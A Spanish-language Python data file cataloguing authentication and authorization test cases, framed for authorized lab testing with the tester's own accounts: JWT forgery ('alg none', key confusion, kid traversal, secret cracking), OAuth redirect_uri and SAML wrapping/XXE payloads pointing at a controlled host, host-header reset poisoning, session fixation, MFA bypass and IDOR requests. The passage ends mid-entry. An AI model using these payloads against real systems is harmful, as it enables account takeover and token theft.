"""Pruebas específicas de autenticación y autorización.

Cada entrada: nombre, objetivo, lenguaje, código adaptable, criterio de lectura,
fuente técnica. Los marcadores se reemplazan con cuentas y objetos propios.
"""

PS_AUTH = "https://portswigger.net/web-security/authentication"
PS_PASS = "https://portswigger.net/web-security/authentication/password-based"
PS_OTHER = "https://portswigger.net/web-security/authentication/other-mechanisms"
PS_MFA = "https://portswigger.net/web-security/authentication/multi-factor"
PS_JWT = "https://portswigger.net/web-security/jwt"
PS_OAUTH = "https://portswigger.net/web-security/oauth"
PS_SAML = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md"
PS_ACCESS = "https://portswigger.net/web-security/access-control"
PS_IDOR = "https://portswigger.net/web-security/access-control/idor"
PS_HOST = "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning"
PATT_ATO = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md"
PATT_MFA = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md"
PATT_JWT = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md"
PATT_OAUTH = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md"
PATT_IDOR = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md"
PATT_MASS = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md"
OWASP_BOLA = "https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/"
OWASP_BFLA = "https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/"
OWASP_API3 = "https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/"
OWASP_MASS = "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
PS_GRAPHQL = "https://portswigger.net/web-security/graphql"
RFC_JWT = "https://datatracker.ietf.org/doc/html/rfc8725"
RFC_JWT_CLAIMS = "https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.5"
RFC_OAUTH = "https://datatracker.ietf.org/doc/html/rfc9700"
OWASP_SAML = "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html"


def P(nombre, objetivo, lenguaje, codigo, interpretacion, fuente):
    return (nombre, objetivo, lenguaje, codigo.strip(), interpretacion, fuente)


AMPLIACIONES = {
    "autenticacion-rota": [
        P(
            "Ruta privada sin credenciales",
            "Repetir una lectura privada propia sin cookie ni bearer token.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}""",
            "Comparar con la respuesta autenticada de A. Un 200 de la SPA sin datos privados no confirma bypass.",
            PS_AUTH,
        ),
        P(
            "Sesión pendiente de MFA",
            "Detener el login tras la contraseña y visitar directamente una función protegida.",
            "http",
            r"""GET /api/account/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_MFA_PENDIENTE}""",
            "Solo es bypass si la sesión intermedia obtiene contenido o ejecuta acciones reservadas al estado autenticado.",
            PS_MFA,
        ),
        P(
            "Logout y replay",
            "Comprobar si el token propio previo sigue autorizando después de cerrar sesión.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_PROPIO_ANTES_DEL_LOGOUT}""",
            "Distinguir un token stateless todavía válido por diseño de una promesa explícita de revocación inmediata.",
            PS_OTHER,
        ),
        P(
            "Cambio de contraseña y sesión anterior",
            "Tras cambiar la contraseña de A, intentar una request con la sesión antigua de A.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A_ANTERIOR_AL_CAMBIO}""",
            "Verificar la política anunciada: algunos productos revocan todas las sesiones, otros permiten excepciones explícitas.",
            PS_OTHER,
        ),
        P(
            "Enumeración por respuesta",
            "Comparar dos correos de prueba, uno existente y otro inexistente, sin intentar contraseñas ajenas.",
            "http",
            r"""POST /login HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_PROPIO}&password=incorrecta-de-prueba

# Control: username={EMAIL_INEXISTENTE_PROPIO}&password=incorrecta-de-prueba""",
            "Repetir con baja frecuencia y comparar mensaje, código y longitud. Diferencias de red o WAF no prueban enumeración.",
            PS_PASS,
        ),
        P(
            "Recordarme tras invalidar la sesión",
            "Comprobar si un token remember-me propio restaura acceso cuando la sesión fue revocada.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: remember-me={TOKEN_RECORDAR_PROPIO}""",
            "El resultado depende de la política de revocación del producto. Documentar qué token creó la nueva sesión.",
            PS_OTHER,
        ),
        P(
            "Diferencia web/API",
            "Usar el mismo estado anónimo en una ruta web y su operación API equivalente.",
            "http",
            r"""GET /api/v1/profile HTTP/1.1
Host: {ORIGEN}
Accept: application/json""",
            "Una UI que redirige al login no protege automáticamente la API; confirmar datos privados en el cuerpo.",
            PS_AUTH,
        ),
    ],
    "jwt": [
        P(
            "Firma inválida como control",
            "Cambiar un claim de un token propio manteniendo la firma original.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {JWT_PROPIO_CLAIM_ALTERADO_FIRMA_ORIGINAL}""",
            "El servidor debe rechazarlo. Una respuesta idéntica a la válida exige comprobar que el claim modificado gobierna una decisión.",
            PS_JWT,
        ),
        P(
            "alg none",
            "Crear un token sin firma para la identidad propia y comprobar rechazo.",
            "python",
            r"""import base64, json
def b64(x): return base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).decode().rstrip('=')
header = {"alg":"none","typ":"JWT"}
claims = {"sub":"{ID_PROPIO}","iss":"{ISS}","aud":"{AUD}"}
print(b64(header)+"."+b64(claims)+".")""",
            "La tercera parte vacía conserva el punto final. Un 200 genérico no prueba aceptación del token.",
            PS_JWT,
        ),
        P(
            "Confusión RS256→HS256",
            "En laboratorio con clave pública propia, verificar que el servidor fija el algoritmo esperado.",
            "bash",
            r"""python3 jwt_tool.py '{JWT_PROPIO_RS256}' -X k -pk publickey.pem""",
            "La firma HS256 hecha con la clave pública solo debería aceptarse si existe confusión de algoritmos; conservar clave pública exacta.",
            PATT_JWT,
        ),
        P(
            "kid como ruta de clave",
            "En laboratorio, probar si kid selecciona un archivo conocido como clave HMAC.",
            "bash",
            r"""python3 jwt_tool.py '{JWT_PROPIO}' -I -hc kid -hv '../../dev/null' -S hs256 -p ''""",
            "El ejemplo depende de la ruta real y del verificador. Una respuesta distinta no prueba firma válida; confirmar con recurso propio.",
            PATT_JWT,
        ),
        P(
            "JWK embebida",
            "Comprobar si el verificador acepta una clave pública incluida dentro del token.",
            "json",
            r"""{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"{KID_PROPIO}","n":"{MODULO_PUBLICO_PROPIO}","e":"AQAB"}}""",
            "Este header se firma con la privada correspondiente en laboratorio. El servidor debe usar su almacén de claves confiables.",
            PS_JWT,
        ),
        P(
            "jku hacia JWKS controlado",
            "Probar si se busca una JWKS aportada por el token en un host propio.",
            "json",
            r"""{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","jku":"https://{CONTROLLED_HOST}/jwks.json"}""",
            "La callback demuestra fetch, no bypass. Para validar aceptación, la JWKS y firma de laboratorio deben coincidir.",
            PS_JWT,
        ),
        P(
            "Secreto HS256 débil",
            "Probar offline una lista pequeña de secretos de laboratorio contra un JWT propio.",
            "bash",
            r"""hashcat -m 16500 jwt-propio.txt candidatos-lab.txt --quiet""",
            "No enviar tokens a servicios externos. Confirmar algoritmo HS256, coincidencia de firma y vigencia de la clave.",
            PATT_JWT,
        ),
        P(
            "Claims temporales y de contexto",
            "Comparar rechazo de un token de prueba vencido o con audiencia distinta.",
            "json",
            r"""{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_NO_PERMITIDA}","exp":1}""",
            "Requiere firma válida de laboratorio; exp, iss y aud se prueban uno por vez para atribuir el resultado.",
            RFC_JWT,
        ),
        P(
            "Uso antes de nbf",
            "Firmar en laboratorio un JWT propio cuyo nbf esté en el futuro.",
            "json",
            r"""{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_ESPERADA}","nbf":4102444800}""",
            "Conservar iss, aud y firma válidos para aislar nbf. El servidor debe rechazarlo antes del instante indicado.",
            RFC_JWT_CLAIMS,
        ),
        P(
            "Confusión entre tipos de token",
            "Probar si una API acepta como access token un ID token propio emitido para el mismo cliente.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {ID_TOKEN_PROPIO_NO_ACCESS_TOKEN}""",
            "El ID token puede estar bien firmado y aun así tener público/propósito incorrecto. Confirmar rechazo y no registrar el token.",
            RFC_JWT,
        ),
        P(
            "jku con autoridad ambigua",
            "Evaluar validación por prefijo de host de JWKS, solo con dominio y clave de laboratorio.",
            "json",
            r"""{"alg":"RS256","kid":"{KID_PROPIO}","jku":"https://{HOST_JWKS_CONFIABLE}@{CONTROLLED_HOST}/jwks.json"}""",
            "El host real de esta URL es CONTROLLED_HOST. Fetch externo no equivale a aceptación: verificar firma y acceso con recurso propio.",
            PS_JWT,
        ),
    ],
    "oauth": [
        P(
            "redirect_uri fuera de la lista",
            "Cambiar solo el destino del flujo propio por un host de prueba no registrado.",
            "http",
            r"""GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{CONTROLLED_HOST}%2Fcallback&state={STATE_PROPIO}&code_challenge={CHALLENGE_PROPIO}&code_challenge_method=S256 HTTP/1.1
Host: {AUTHORIZATION_SERVER}""",
            "El servidor debe rechazar la URI antes de emitir code; una página de error que refleja la URI no prueba fuga.",
            RFC_OAUTH,
        ),
        P(
            "Coincidencia por prefijo",
            "Probar una URI cuyo inicio coincide con la registrada pero cuya autoridad es propia.",
            "text",
            r"""redirect_uri=https://{HOST_REGISTRADO}.{CONTROLLED_HOST}/callback
redirect_uri=https://{HOST_REGISTRADO}@{CONTROLLED_HOST}/callback""",
            "Usar un dominio controlado y examinar Location final. Solo hay impacto si el code/token llega a un origen no autorizado.",
            PATT_OAUTH,
        ),
        P(
            "Open redirect en callback permitido",
            "Comprobar si una URI registrada contiene un redirect propio que reenvía el code.",
            "http",
            r"""GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{HOST_REGISTRADO}%2Fredirect%3Fnext%3Dhttps%253A%252F%252F{CONTROLLED_HOST}%252Fcb&state={STATE_PROPIO} HTTP/1.1
Host: {AUTHORIZATION_SERVER}""",
            "La cadena requiere que la URI completa esté registrada y que el code sea canjeable; PKCE puede impedir el impacto.",
            PS_OAUTH,
        ),
        P(
            "Callback sin state",
            "Visitar el callback propio sin un valor de estado vinculado a un flujo iniciado.",
            "http",
            r"""GET /oauth/callback?code={CODE_PROPIO_DE_PRUEBA} HTTP/1.1
Host: {CLIENT_APP}
Cookie: session={COOKIE_PROPIA}""",
            "La aplicación debe rechazarlo. Si enlaza otra cuenta, confirmar con dos cuentas propias y sin usar códigos ajenos.",
            PS_OAUTH,
        ),
        P(
            "State de otra transacción",
            "Intercambiar estados de dos flujos propios sin mezclar identidades de terceros.",
            "text",
            r"""Inicio A -> state={STATE_A}, code_challenge={CHALLENGE_A}
Inicio B -> state={STATE_B}, code_challenge={CHALLENGE_B}
Callback B con state={STATE_A} -> debe rechazarse""",
            "Demostrar rechazo/aceptación por transacción; una comparación textual de states no sustituye prueba de sesión resultante.",
            RFC_OAUTH,
        ),
        P(
            "PKCE ausente o degradado",
            "En cliente público, comparar authorization request sin challenge y con método plain.",
            "http",
            r"""GET /authorize?response_type=code&client_id={CLIENT_PUBLICO}&redirect_uri={REDIRECT_URI_REGISTRADA}&state={STATE_PROPIO}&code_challenge={VERIFIER_PROPIO}&code_challenge_method=plain HTTP/1.1
Host: {AUTHORIZATION_SERVER}""",
            "Repetir sin code_challenge por separado. El impacto exige comprobar si el code se canjea sin verifier S256.",
            RFC_OAUTH,
        ),
        P(
            "Código de autorización reutilizado",
            "Canjear dos veces el mismo code de una cuenta propia.",
            "http",
            r"""POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_ID}&code={CODE_PROPIO_YA_CANJEADO}&redirect_uri={REDIRECT_URI_REGISTRADA}&code_verifier={VERIFIER_PROPIO}""",
            "El segundo canje debe fallar. El code es de un solo uso; no registrar tokens reales en evidencias.",
            PATT_OAUTH,
        ),
        P(
            "Confusión de emisor",
            "En cliente con dos proveedores, comparar iss y estado antes de aceptar el callback.",
            "text",
            r"""Flujo iniciado con {ISSUER_A} y state={STATE_A}
Callback observado con iss={ISSUER_B} y state={STATE_A}
Resultado esperado: rechazo antes de crear sesión""",
            "La prueba requiere dos emisores configurados en un entorno controlado; un cambio de URL por sí solo no prueba mix-up.",
            RFC_OAUTH,
        ),
        P(
            "Alcance ampliado en autorización",
            "Pedir un scope que el cliente de prueba no tiene concedido y revisar el token emitido.",
            "http",
            r"""GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_REGISTRADA}&state={STATE_PROPIO}&scope=openid%20{SCOPE_NO_CONCEDIDO}&code_challenge={CHALLENGE_PROPIO}&code_challenge_method=S256 HTTP/1.1
Host: {AUTHORIZATION_SERVER}""",
            "El scope debe ser denegado o sujeto a consentimiento/política. Un parámetro aceptado no prueba que el token tenga el permiso.",
            PS_OAUTH,
        ),
        P(
            "Código de otro client_id",
            "Intentar canjear un code propio emitido para cliente A presentando client_id B.",
            "http",
            r"""POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_B_PROPIO}&code={CODE_EMITIDO_PARA_CLIENT_A}&redirect_uri={REDIRECT_URI_A}&code_verifier={VERIFIER_A}""",
            "El token endpoint debe ligar code a client_id y redirect_uri de origen; usar solo clientes administrados en el laboratorio.",
            RFC_OAUTH,
        ),
        P(
            "Token para otra audiencia",
            "Enviar a recurso B un access token propio cuyo aud corresponde únicamente a recurso A.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {RECURSO_B}
Authorization: Bearer {ACCESS_TOKEN_PROPIO_AUD_A}""",
            "B debe rechazarlo aunque la firma sea válida. Verificar el aud real y que B no acepte el token por compartir emisor.",
            RFC_OAUTH,
        ),
    ],
    "saml": [
        P(
            "Firma alterada",
            "Cambiar un NameID de una respuesta SAML propia sin rehacer XML Signature.",
            "xml",
            r"""<saml:NameID>{EMAIL_PROPIO_MODIFICADO}</saml:NameID>""",
            "La respuesta debe rechazarse. Hacer el cambio dentro de una SAMLResponse válida propia y comparar con original.",
            PS_SAML,
        ),
        P(
            "Signature stripping",
            "Quitar Signature de una respuesta propia y verificar que el SP la rechace.",
            "xml",
            r"""<samlp:Response ID="{RESPONSE_ID_PROPIO}" Destination="{ACS_PROPIA}">
  <saml:Assertion ID="{ASSERTION_ID_PROPIO}">
    <saml:Subject><saml:NameID>{EMAIL_PROPIO}</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>""",
            "Es un esquema de laboratorio: conservar Issuer, Audience, Conditions y demás campos requeridos del mensaje real.",
            PS_SAML,
        ),
        P(
            "Wrapping de assertion",
            "En laboratorio, duplicar la assertion: una firmada propia y otra no firmada con otra identidad controlada.",
            "xml",
            r"""<samlp:Response>
  <saml:Assertion ID="{ID_FORJADA}">
    <saml:Subject><saml:NameID>{EMAIL_CUENTA_B_PROPIA}</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="{ID_FIRMADA}">
    <ds:Signature><ds:SignedInfo><ds:Reference URI="#{ID_FIRMADA}"/></ds:SignedInfo></ds:Signature>
    <saml:Subject><saml:NameID>{EMAIL_CUENTA_A_PROPIA}</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>""",
            "El bloque muestra la disposición XSW, no una firma válida completa. Partir de respuesta real y verificar qué assertion se consume.",
            PS_SAML,
        ),
        P(
            "Replay de respuesta",
            "Reenviar una SAMLResponse ya consumida por la misma cuenta propia.",
            "http",
            r"""POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_PROPIA_YA_USADA}&RelayState={RELAY_PROPIO}""",
            "Comprobar si InResponseTo y el ID ya consumido impiden crear nueva sesión; no inferir bypass por una redirección.",
            PS_SAML,
        ),
        P(
            "Audience y Destination",
            "Alterar un campo por vez en una respuesta propia firmada por un IdP de laboratorio.",
            "xml",
            r"""<saml:Audience>{SP_NO_DESTINATARIO_DE_LAB}</saml:Audience>
<samlp:Response Destination="{ACS_NO_REGISTRADA_DE_LAB}">...</samlp:Response>""",
            "Si se modifica una respuesta ya firmada, el rechazo puede deberse a firma inválida; generar una nueva firma de lab para aislar el control.",
            PS_SAML,
        ),
        P(
            "Comentario XML en NameID",
            "Evaluar diferencias de parser en un IdP/SP de laboratorio con dos cuentas propias.",
            "xml",
            r"""<saml:NameID>usuario<!--prueba-->@{DOMINIO_DE_LAB}</saml:NameID>""",
            "La técnica depende de normalización de texto XML y biblioteca. Confirmar identidad de la sesión creada, no solo texto reflejado.",
            PS_SAML,
        ),
        P(
            "Entidad XML externa en parser SAML",
            "Verificar si una entidad provoca callback a un dominio de prueba, sin solicitar archivos.",
            "xml",
            r"""<!DOCTYPE r [<!ENTITY prueba SYSTEM "https://{CONTROLLED_HOST}/saml-canary">]>
<samlp:Response>...&prueba;...</samlp:Response>""",
            "Muchos parsers rechazan DTD antes de verificar SAML. Una callback prueba XXE, no suplantación de identidad.",
            PS_SAML,
        ),
        P(
            "InResponseTo de otra solicitud",
            "En SP e IdP de laboratorio, ligar una respuesta firmada a un AuthnRequest distinto.",
            "xml",
            r"""<samlp:Response InResponseTo="{AUTHN_REQUEST_A}" Destination="{ACS_PROPIA}">
  <saml:Assertion ID="{ASSERTION_FIRMADA_B}">...</saml:Assertion>
</samlp:Response>""",
            "Generar y firmar la respuesta con IdP propio; alterar XML ya firmado solo prueba rechazo criptográfico.",
            OWASP_SAML,
        ),
        P(
            "Condiciones temporales",
            "Emitir en laboratorio una assertion propia firmada con NotOnOrAfter anterior al momento actual.",
            "xml",
            r"""<saml:Conditions NotBefore="{FECHA_PASADA}" NotOnOrAfter="{FECHA_YA_VENCIDA}">
  <saml:AudienceRestriction><saml:Audience>{ENTITY_ID_SP}</saml:Audience></saml:AudienceRestriction>
</saml:Conditions>""",
            "El SP debe rechazar la assertion vencida; conservar firma válida y comparar contra una ventana vigente.",
            OWASP_SAML,
        ),
        P(
            "RelayState como redirección",
            "Con respuesta válida propia, cambiar solo RelayState por una URL controlada.",
            "http",
            r"""POST /saml/acs HTTP/1.1
Host: {SP_EN_ALCANCE}
Content-Type: application/x-www-form-urlencoded

SAMLResponse={RESPUESTA_PROPIA_VALIDA}&RelayState=https%3A%2F%2F{CONTROLLED_HOST}%2Freturn""",
            "Si el SP redirige fuera de su lista permitida, reportar open redirect en flujo SAML; no implica por sí solo bypass de firma.",
            OWASP_SAML,
        ),
    ],
    "fijacion-sesion": [
        P(
            "Rotación al iniciar sesión",
            "Capturar la cookie anónima y autenticar esa misma sesión propia.",
            "bash",
            r"""curl -i -c anon.cookies "https://{ORIGEN}/login"
curl -i -b anon.cookies -c login.cookies -X POST \
  --data-urlencode "username={EMAIL_PROPIO}" \
  --data-urlencode "password={PASSWORD_PROPIA}" \
  "https://{ORIGEN}/login" """,
            "Comparar valores de sesión; si no rotan, todavía falta demostrar que otro navegador puede recibir el ID previo.",
            "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/",
        ),
        P(
            "ID anónimo tras login",
            "Usar el ID anterior desde una segunda sesión de prueba después del login de A.",
            "http",
            r"""GET /api/me HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ANONIMO_ANTES_DEL_LOGIN}""",
            "Una respuesta con identidad de A confirma que el ID preconocido se elevó; usar cuentas propias.",
            "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/",
        ),
        P(
            "Adopción de ID aportado",
            "Enviar un ID sintácticamente válido elegido por el tester antes de autenticarse.",
            "http",
            r"""GET /login HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ELEGIDO_DE_PRUEBA}""",
            "El servidor debería emitir un ID nuevo. Si conserva el elegido, comprobar su validez después de login.",
            "https://community.owasp.org/attacks/Session_fixation",
        ),
        P(
            "Session ID en URL",
            "Probar si un token de sesión propio en la URL se adopta al autenticarse.",
            "http",
            r"""GET /login?sessionid={ID_ANONIMO_PROPIO} HTTP/1.1
Host: {ORIGEN}""",
            "Solo aplica si la aplicación usa IDs en URL. Verificar que el valor persiste y autoriza después de login.",
            "https://community.owasp.org/attacks/Session_fixation",
        ),
        P(
            "Campo oculto de sesión",
            "Modificar un hidden field de sesión únicamente si el formulario real lo contiene.",
            "http",
            r"""POST /login HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

username={EMAIL_PROPIO}&password={PASSWORD_PROPIA}&sessionid={ID_ANONIMO_PROPIO}""",
            "No agregar campos inventados a una app que no los usa. Confirmar en Set-Cookie e identidad efectiva.",
            "https://community.owasp.org/attacks/Session_fixation",
        ),
        P(
            "Cookie de subdominio",
            "Comparar si una cookie Domain amplia de un subdominio propio domina la sesión del host principal.",
            "http",
            r"""GET /login HTTP/1.1
Host: {HOST_PRINCIPAL}
Cookie: session={ID_EMITIDO_EN_SUBDOMINIO_PROPIO}""",
            "Se necesita control autorizado del subdominio y cookie Domain compatible; no basta que el navegador envíe dos cookies.",
            "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/",
        ),
        P(
            "Rotación en elevación",
            "Tras entrar como usuario bajo, ejecutar un paso de elevación propio y comparar IDs.",
            "http",
            r"""GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={ID_ANTES_DE_ELEVAR}""",
            "Si una autenticación adicional otorga privilegio, el ID anterior no debería adquirirlos si el diseño exige rotación.",
            "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/",
        ),
    ],
    "reset-password-poisoning": [
        P(
            "Host directo",
            "Solicitar reset solo de la cuenta propia con Host controlado.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "Inspeccionar el correo recibido: la prueba relevante es la URL con token, no el texto HTTP inmediato.",
            PS_HOST,
        ),
        P(
            "X-Forwarded-Host",
            "Conservar Host legítimo y variar el host que el proxy podría entregar al backend.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "Confirmar dominio del enlace recibido. No afirmar toma de cuenta si el token no aparece o no es canjeable.",
            "https://portswigger.net/web-security/host-header/exploiting",
        ),
        P(
            "Forwarded host",
            "Aislar la cabecera estándar Forwarded en una solicitud propia.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {ORIGEN}
Forwarded: host={CONTROLLED_HOST};proto=https
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "El backend puede ignorarla. Registrar si el correo usa exactamente el host aportado.",
            "https://portswigger.net/web-security/host-header/exploiting",
        ),
        P(
            "X-Host",
            "Probar una cabecera de override documentada, por separado.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "Comparar con el caso base sin X-Host; solo la URL recibida establece influencia real.",
            "https://portswigger.net/web-security/host-header/exploiting",
        ),
        P(
            "X-HTTP-Host-Override",
            "Probar otro override en una request separada.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-HTTP-Host-Override: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "Evitar envíos repetidos masivos; los correos y tokens de la cuenta propia permiten comparar.",
            "https://portswigger.net/web-security/host-header/exploiting",
        ),
        P(
            "Puerto de Host",
            "Comprobar si el validador acepta dominio correcto pero usa un puerto manipulado en el enlace.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {ORIGEN}:8443
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "No es fuga si el host sigue siendo legítimo; interesa un parser que valida host y genera una URL distinta.",
            "https://portswigger.net/web-security/host-header/exploiting",
        ),
        P(
            "Host duplicado en laboratorio",
            "Observar desacuerdo de parsing en un entorno aislado propio.",
            "http",
            r"""POST /forgot-password HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}""",
            "Muchos frontends lo rechazan. No enviar a infraestructura compartida sin permiso porque puede afectar enrutamiento.",
            "https://portswigger.net/web-security/host-header/exploiting",
        ),
    ],
    "mfa-bypass": [
        P(
            "Forced browsing antes del OTP",
            "Con contraseña propia válida y MFA pendiente, pedir la ruta final directamente.",
            "http",
            r"""GET /my-account HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_MFA_PENDIENTE}""",
            "Confirmar datos o acciones protegidas, no solo un 200 de una pantalla vacía.",
            PATT_MFA,
        ),
        P(
            "Endpoint API alternativo",
            "Comparar la UI MFA con la API que alimenta la cuenta bajo la misma sesión pendiente.",
            "http",
            r"""GET /api/v1/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_MFA_PENDIENTE}""",
            "Una UI bloqueada y una API con datos privados muestran enforcement inconsistente.",
            PS_MFA,
        ),
        P(
            "OTP de cuenta B en flujo A",
            "Usar dos cuentas propias para comprobar vinculación de código a usuario y transacción.",
            "http",
            r"""POST /mfa/verify HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={OTP_ACTUAL_DE_B}""",
            "Si A avanza, confirmar identidad y estado final. Los OTP de terceros quedan fuera.",
            PS_MFA,
        ),
        P(
            "OTP reutilizado",
            "Usar por segunda vez un código propio ya consumido.",
            "http",
            r"""POST /mfa/verify HTTP/1.1
Host: {ORIGEN}
Cookie: session={NUEVA_SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={OTP_PROPIO_YA_CONSUMIDO}""",
            "Distinguir TOTP aún vigente de código de un solo uso si el producto promete consumo único.",
            PATT_MFA,
        ),
        P(
            "Valor vacío y tipo inesperado",
            "Comparar rechazo de código vacío, null o estructura, una variación por request.",
            "json",
            r"""{"otp":null}""",
            "El servidor debe validar tipo y presencia. Un error 500 es pista de manejo débil, no bypass por sí solo.",
            PATT_MFA,
        ),
        P(
            "Código de respaldo",
            "Probar consumo único de un recovery code emitido a la propia cuenta.",
            "http",
            r"""POST /mfa/recovery HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={CODIGO_RESCATE_PROPIO_YA_USADO}""",
            "El segundo uso debe fallar; guardar el código solo localmente y eliminarlo de la evidencia.",
            PATT_MFA,
        ),
        P(
            "Remember device en navegador distinto",
            "Reutilizar un token propio de dispositivo confiable en otro perfil controlado.",
            "http",
            r"""GET /my-account HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}; trusted_device={TOKEN_DISPOSITIVO_PROPIO}""",
            "Documentar si está ligado a cuenta, dispositivo, expiración y revocación; un cookie portátil puede ser diseño débil.",
            PS_MFA,
        ),
        P(
            "Cambio de contraseña y factor",
            "Usar recuperación de la cuenta propia y revisar si crea una sesión plenamente verificada.",
            "http",
            r"""GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_TRAS_RESET_PROPIO}""",
            "Solo hay bypass si el reset permite acciones protegidas por MFA sin segundo factor equivalente.",
            PATT_MFA,
        ),
        P(
            "Sesión anterior al activar MFA",
            "Comparar sesiones propias abiertas antes y después de activar MFA.",
            "http",
            r"""GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ANTERIOR_A_ACTIVAR_MFA}""",
            "Revisar política de revocación; puede requerir invalidar sesiones viejas al activar factor.",
            PATT_MFA,
        ),
    ],
    "idor": [
        P(
            "ID en segmento de ruta",
            "Con cuentas A y B propias, leer desde A el objeto creado por B.",
            "http",
            r"""GET /api/objects/{ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}""",
            "Comparar con lectura autorizada de B y con ID inexistente. Confirmar datos privados de B, no solo 200.",
            OWASP_BOLA,
        ),
        P(
            "ID en query string",
            "Cambiar solo el identificador de una URL observada en el tráfico real.",
            "http",
            r"""GET /api/invoices?invoice_id={FACTURA_PROPIA_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}""",
            "Una factura de B devuelta a A confirma fallo horizontal; registrar identificadores redactados.",
            PS_IDOR,
        ),
        P(
            "ID en cuerpo JSON",
            "Consultar un resumen de objeto de B cambiando el objectId del cuerpo bajo sesión A.",
            "http",
            r"""POST /api/objects/summary HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"objectId":"{ID_OBJETO_B}"}""",
